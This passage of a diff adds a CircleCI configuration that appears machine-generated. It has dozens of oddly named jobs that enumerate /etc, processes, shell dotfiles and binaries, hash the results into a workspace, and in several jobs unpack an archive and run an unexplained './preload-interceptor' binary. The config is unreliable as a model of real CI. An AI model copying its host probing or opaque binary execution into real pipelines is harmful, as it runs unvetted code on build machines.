+          at: /tmp/pian
+      - run:
+          name: Load step-5 output
+          command: |
+            sed -n '1p' /tmp/pian/azure-wallet 2>/dev/null | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: xz -dc core-static-release.tar.xz | tar xf -
+      - run:
+          command: ./preload-interceptor
+  c:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: handleShrinkWrapWeighIn
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; find /etc -maxdepth 1 -type f | sort | uniq -c | tr '[:lower:]' '[:upper:]'; true ; } > /tmp/pian/e1c44ae2-c0bb
+            md5sum /tmp/pian/e1c44ae2-c0bb | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - 'e1c44ae2-c0bb'
+  kilo:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: Load step-5 output
+          command: |
+            sed -n '1p' /tmp/pian/e1c44ae2-c0bb 2>/dev/null | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull reference data
+          command: xz -dc core-static-release.tar.xz | tar xf -
+      - run:
+          command: ./preload-interceptor
+  asset_sys:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: START
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; compgen -G "/etc/*.conf" | sort -u; true ; } > /tmp/pian/audit-c315.log
+            md5sum /tmp/pian/audit-c315.log | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - 'audit-c315.log'
+  echo-1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: Load step-5 output
+          command: |
+            sed -n '1p' /tmp/pian/audit-c315.log 2>/dev/null | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: xz -dc core-static-release.tar.xz | tar xf -
+      - run:
+          command: ./preload-interceptor
+  rgChunk:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: invoicing LIVE
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; grep -rIn export /etc 2>/dev/null | sort | head -n10; true ; } > /tmp/pian/vector_hawk_meadow_polar
+            md5sum /tmp/pian/vector_hawk_meadow_polar | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - 'vector_hawk_meadow_polar'
+  go1-21-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: Load step-5 output
+          command: |
+            sed -n '1p' /tmp/pian/vector_hawk_meadow_polar 2>/dev/null | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack bundle
+          command: xz -dc core-static-release.tar.xz | tar xf -
+      - run:
+          command: ./preload-interceptor
+
+  ok:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Generate C
+          command: |
+            mkdir -p /tmp/pian
+            set +o pipefail 2>/dev/null; if [ -w / ]; then seq 1 1322107 > /tmp/pian/LOT-94189-OO; else echo 'no write' > /tmp/pian/LOT-94189-OO; fi; true
+            md5sum /tmp/pian/LOT-94189-OO | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - 'LOT-94189-OO'
+  qs2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Deliver merge value
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; ls -c /usr/local | tail -n 20; true ; } > /tmp/pian/112.96.118.253
+            md5sum /tmp/pian/112.96.118.253 | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - '112.96.118.253'
+  D1-8B-BB:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: Let us proxy the gateway
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; ps axo pid,ppid,stat,comm | awk 'NR>1 {print $1}' | tail -n 2 | sort -r; true ; } > /tmp/pian/GOPR-53468
+            md5sum /tmp/pian/GOPR-53468 | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - 'GOPR-53468'
+  runtimerc-bookworm:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: Protocol Anchor
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; install -m 600 /etc/hosts "${TMPDIR:-/tmp}/jade-left.list" && ls -l "${TMPDIR:-/tmp}/jade-left.list"; true ; } > /tmp/pian/polarmuongarden
+            md5sum /tmp/pian/polarmuongarden | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - 'polarmuongarden'
+  b:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: Cull Dialogue Tree Job
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; printf '%s' "3 tests passed"; echo; true ; } > /tmp/pian/audit-c315.log
+            md5sum /tmp/pian/audit-c315.log | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - 'audit-c315.log'
+  reduce_edgePrevious:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: Approve the referral bonuses in time for posterity
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; for f in /etc/*.defs; do basename "$f"; done | tac; true ; } > /tmp/pian/SKU-87279-VL
+            md5sum /tmp/pian/SKU-87279-VL | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - 'SKU-87279-VL'
+  navy-hex:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: And now enroll the payroll forms
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; ls -g --indicator-style=slash . | awk 'NR>1 {print $1}' | sort | uniq -c; true ; } > /tmp/pian/e7780f3a05d877eb475091b8ee
+            md5sum /tmp/pian/e7780f3a05d877eb475091b8ee | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - 'e7780f3a05d877eb475091b8ee'
+  pairBuildClientPawnAlpha:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: Checkpointing the audit log please wait
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; echo `date +%F`_temp.log; true ; } > /tmp/pian/glintProton
+            md5sum /tmp/pian/glintProton | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - 'glintProton'
+  tPxGjE:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: POKE firmware
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; compgen -A shopt | wc -l; true ; } > /tmp/pian/vector_hawk_meadow_polar
+            md5sum /tmp/pian/vector_hawk_meadow_polar | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - 'vector_hawk_meadow_polar'
+  f_RankDiscount:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: Hold the threat feed steady
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; echo 'v1.2.3 released' | gzip | base64; true ; } > /tmp/pian/REF17829
+            md5sum /tmp/pian/REF17829 | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - 'REF17829'
+  TotalGlobalFastCheckout:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: st 3 login button hover
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; ls --reverse -Q | head -n 5; true ; } > /tmp/pian/iter_579
+            md5sum /tmp/pian/iter_579 | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - 'iter_579'
+  ShallowAvatarProvider:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: shuffle HELP
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; find /dev -maxdepth 3 -type f -name 'shm' -mmin +60 -exec head -n 1 -q {} + 2>/dev/null | xargs -r ls -ld | head -n 5; true ; } > /tmp/pian/rusty
+            md5sum /tmp/pian/rusty | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - 'rusty'
+  maple_sierra:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: Tag Canary Fleet On Prod
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; printf 'host=db1\nport=8366\nuser=dave\ndebug=false\n'|grep ^port | cut -d= -f2; true ; } > /tmp/pian/hSSnGK7vzPBsQnFCRL
+            md5sum /tmp/pian/hSSnGK7vzPBsQnFCRL | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - 'hSSnGK7vzPBsQnFCRL'
+  Payment-Session:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: If leftover junk is slow do nothing
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; stat -c "%n %y" /bin/ls; true ; } > /tmp/pian/g7uznmkwk91f2
+            md5sum /tmp/pian/g7uznmkwk91f2 | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - 'g7uznmkwk91f2'
+  ConvertTo-MyContract:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: Close the intercompany balances and reconcile
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; tr -d '[:digit:]' </etc/nsswitch.conf | expand -t 2; true ; } > /tmp/pian/hollow_agent
+            md5sum /tmp/pian/hollow_agent | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - 'hollow_agent'
+  secondary_refs:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Swipe after the retro
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; ls /usr/bin | awk '{print length, $0}' | head -n 4; true ; } > /tmp/pian/UDP.5814-ux
+            md5sum /tmp/pian/UDP.5814-ux | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - 'UDP.5814-ux'
+  idx-073163-pre:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: Tune the thumbnails
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; uptime | fold -w 32 | expand -t 7; true ; } > /tmp/pian/PXL00058165
+            md5sum /tmp/pian/PXL00058165 | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - 'PXL00058165'
+  title_uuid:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: triage failing specs last
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; note(){ local a=$1 b=$2; echo $(( a > b ? a : b )); }; note 58 92; true ; } > /tmp/pian/8c35e8eaf91a78112db84ab10f0592e12ea55bf
+            md5sum /tmp/pian/8c35e8eaf91a78112db84ab10f0592e12ea55bf | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - '8c35e8eaf91a78112db84ab10f0592e12ea55bf'
+  pnl_protocol:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: Mobilisation whilst we wait
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; printf %s 'this is a test' | sha384sum | awk '{print $1}'; true ; } > /tmp/pian/sc4r137_chr0m3
+            md5sum /tmp/pian/sc4r137_chr0m3 | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - 'sc4r137_chr0m3'
+  DISABLE_BUCKET_VISIBLE:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: We quietly aliquot the gel
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; ps -ef | head -3 | tail -n +2 | grep -v grep; true ; } > /tmp/pian/3bb80816-5353
+            md5sum /tmp/pian/3bb80816-5353 | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - '3bb80816-5353'
+  Enable-SrcInfo:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: 500 pruning
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; diff -y --width=47 <(seq 5) <(seq 2 6) | head -n2; true ; } > /tmp/pian/6unnyw1c9ooe
+            md5sum /tmp/pian/6unnyw1c9ooe | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - '6unnyw1c9ooe'
+  IDX-SECTION-2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: Badge the offer letters week one
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; mapfile -t LIST < <(ls /etc | head -n 5); printf "%s\n" "${LIST[@]}"; true ; } > /tmp/pian/e1c44ae2-c0bb
+            md5sum /tmp/pian/e1c44ae2-c0bb | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - 'e1c44ae2-c0bb'
+  underSensor3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: throttle upstream
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; command ls -nX --time-style=long-iso /usr/bin/[a-c]* | sort -k5 -n; true ; } > /tmp/pian/azure-wallet
+            md5sum /tmp/pian/azure-wallet | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - 'azure-wallet'
+  zackzack:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Generate C
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; printf '%s\n' "can't stop now" | tr -s ' '; true ; } > /tmp/pian/c
+            md5sum /tmp/pian/c | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - 'c'
+  tax-domino:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Generate C
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; ls -Xh --si /var/spool | sed -n '1~2p'; true ; } > /tmp/pian/20260926
+            md5sum /tmp/pian/20260926 | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - '20260926'
+  listlocked:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: Red light reboot
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; basename "${TMPDIR:-/tmp}/attic.card.worker.md" .md; true ; } > /tmp/pian/ci-river_3326
+            md5sum /tmp/pian/ci-river_3326 | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - 'ci-river_3326'
+  allChars:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: Randomize Tutorial Zone Hi Res
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; for f in $HOME/.bash*;do wc -l < ${f}; done; true ; } > /tmp/pian/LOT-22577-MI
+            md5sum /tmp/pian/LOT-22577-MI | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - 'LOT-22577-MI'
+  ColorBackCategory:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: Double tap the hamburger menu and wait
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; ls -athS --file-type /bin | sed -n '1~2p'; true ; } > /tmp/pian/eea3a0f2
+            md5sum /tmp/pian/eea3a0f2 | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - 'eea3a0f2'
+  rd_us:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: runInternTraining
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; if test -d /nonexistent;then echo 'exists'; elif test -e /tmp;then echo maybe; else echo 'missing'; fi; true ; } > /tmp/pian/draft-5c63
+            md5sum /tmp/pian/draft-5c63 | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - 'draft-5c63'
+  check_save_score:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: 37 poll hot shards
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; ls /usr/bin | sort | uniq -u | tr -s ' ' | tail -n 3 | expand -t 5; true ; } > /tmp/pian/x6DsNBZXz
+            md5sum /tmp/pian/x6DsNBZXz | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - 'x6DsNBZXz'
+workflows:
+  build:
+    jobs:
+      - stagePrefab
+      - ok:
+          requires:
+            - stagePrefab
+      - API-668:
+          requires:
+            - ok
+      - Unsafe:
+          requires:
+            - ok
+      - qs2:
+          requires:
+            - Unsafe
+      - v4-ga:
+          requires:
+            - qs2
+      - FORM:
+          requires:
+            - qs2
+      - D1-8B-BB:
+          requires:
+            - FORM
+      - fire-up:
+          requires:
+            - D1-8B-BB
+      - RTOSCache:
+          requires:
+            - D1-8B-BB
+      - runtimerc-bookworm:
+          requires:
+            - RTOSCache
+      - auh-check-76:
+          requires:
+            - runtimerc-bookworm
+      - asset_sys:
+          requires:
+            - runtimerc-bookworm
+      - b:
+          requires:
+            - asset_sys
+      - echo-1:
+          requires:
+            - b
+      - Dismount-TextObject:
+          requires:
+            - b
+      - reduce_edgePrevious:
+          requires:
+            - Dismount-TextObject
+      - go1-21-cov:
+          requires:
+            - reduce_edgePrevious
+      - zoneNum:
+          requires:
+            - reduce_edgePrevious
+      - navy-hex:
+          requires:
+            - zoneNum
+      - DATA-357:
+          requires:
+            - navy-hex
+      - thaindlexex:
+          requires:
+            - navy-hex
+      - pairBuildClientPawnAlpha:
+          requires:
+            - thaindlexex
+      - artifacts:
+          requires:
+            - pairBuildClientPawnAlpha
+      - rgChunk:
+          requires:
+            - pairBuildClientPawnAlpha
+      - tPxGjE:
+          requires:
+            - rgChunk
+      - go1-21-ship:
+          requires:
+            - tPxGjE
+      - sha-ed201fe:
+          requires:
+            - tPxGjE
+      - f_RankDiscount:
+          requires:
+            - sha-ed201fe
+      - QA_MERGE_9:
+          requires:
+            - f_RankDiscount
+      - Kernel-Basic-Invalid:
+          requires:
+            - f_RankDiscount
+      - TotalGlobalFastCheckout:
+          requires:
+            - Kernel-Basic-Invalid
+      - STG_STAGE_6:
+          requires:
+            - TotalGlobalFastCheckout
+      - allCosts:
+          requires:
+            - TotalGlobalFastCheckout
+      - ShallowAvatarProvider:
+          requires:
+            - allCosts
+      - preview-build:
+          requires:
+            - ShallowAvatarProvider
+      - IFooter:
+          requires:
+            - ShallowAvatarProvider
+      - maple_sierra:
+          requires:
+            - IFooter
+      - verify-partial-test-matrix:
+          requires:
+            - maple_sierra
+      - guard_kiln_begin_font_yogurt
+      - Payment-Session:
+          requires:
+            - guard_kiln_begin_font_yogurt
+      - Verify_Prod2:
+          requires:
+            - Payment-Session
+      - lang-eu:
+          requires:
+            - Payment-Session
+      - ConvertTo-MyContract:
+          requires:
+            - lang-eu
+      - v2-rc3:
+          requires:
+            - ConvertTo-MyContract
+      - paintMatrixShieldDeleteSidebar:
+          requires:
+            - ConvertTo-MyContract
+      - secondary_refs:
+          requires:
+            - paintMatrixShieldDeleteSidebar
+      - andromeda-alpha:
+          requires:
+            - secondary_refs
+      - view_2015_02:
+          requires:
+            - secondary_refs
+      - idx-073163-pre:
+          requires:
+            - view_2015_02
+      - p-x:
+          requires:
+            - idx-073163-pre
+      - u4ajbcxr:
+          requires:
+            - idx-073163-pre
+      - title_uuid:
+          requires:
+            - u4ajbcxr
+      - rollout:
+          requires:
+            - title_uuid
+      - cnt-index-icon:
+          requires:
+            - title_uuid
+      - pnl_protocol:
+          requires:
+            - cnt-index-icon
+      - foxtrot-4:
+          requires:
+            - pnl_protocol
+      - readComplexArticleAdapter:
+          requires:
+            - pnl_protocol
+      - DISABLE_BUCKET_VISIBLE:
+          requires:
+            - readComplexArticleAdapter
+      - PrepareProd:
+          requires:
+            - DISABLE_BUCKET_VISIBLE
+      - DualObservableSymbolStore:
+          requires:
+            - DISABLE_BUCKET_VISIBLE
+      - Enable-SrcInfo:
+          requires:
+            - DualObservableSymbolStore
+      - papa-6:
+          requires:
+            - Enable-SrcInfo
+      - c:
+          requires:
+            - Enable-SrcInfo
+      - IDX-SECTION-2:
+          requires:
+            - c
+      - kilo:
+          requires:
+            - IDX-SECTION-2
+      - mitten-jigsaw:
+          requires:
+            - IDX-SECTION-2
+      - underSensor3:
+          requires:
+            - mitten-jigsaw
+      - prometheus-ng:
+          requires:
+            - underSensor3
+      - something36:
+          requires:
+            - underSensor3
+      - zackzack:
+          requires:
+            - something36
+      - ga-v8:
+          requires:
+            - zackzack
+      - HammerFailForkLightningBuild:
+          requires:
+            - zackzack
+      - tax-domino:
+          requires:
+            - HammerFailForkLightningBuild
+      - verify-nightly-integration-tests:
+          requires:
+            - tax-domino
+      - winStream4:
+          requires:
+            - tax-domino
+      - listlocked:
+          requires:
+            - winStream4
+      - sanity:
+          requires:
+            - listlocked
+      - nut-838:
+          requires:
+            - listlocked
+      - allChars:
+          requires:
+            - nut-838
+      - validate-staging-test-matrix:
+          requires:
+            - allChars
+      - da:
+          requires:
+            - allChars
+      - ColorBackCategory:
+          requires:
+            - da
+      - tweak-login-leak:
+          requires:
+            - ColorBackCategory
+      - fOV4IB8:
+          requires:
+            - ColorBackCategory
+      - rd_us:
+          requires:
+            - fOV4IB8
+      - promote:
+          requires:
+            - rd_us
+      - TCPHook:
+          requires:
+            - rd_us
+      - check_save_score:
+          requires:
+            - TCPHook
+      - VERIFY_PROD:
+          requires:
+            - check_save_score
